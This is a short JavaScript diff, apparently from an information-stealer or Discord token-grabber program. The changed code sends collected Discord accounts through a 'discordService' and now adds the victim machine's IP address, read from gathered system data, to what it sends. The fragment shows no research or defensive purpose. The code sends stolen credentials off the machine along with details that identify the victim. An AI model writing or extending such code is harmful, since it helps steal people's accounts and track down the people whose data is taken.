@@ -176,7 +176,8 @@ class Application {
 
             // Send Discord accounts if available
             if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
-                await this.discordService.sendAccountEmbeds(this.results.discord);
+                const systemInfo = stats.getRawData().system;
+                await this.discordService.sendAccountEmbeds(this.results.discord, systemInfo.ip || 'Unknown');
             }
 
             logger.info('Data processing and sending completed');
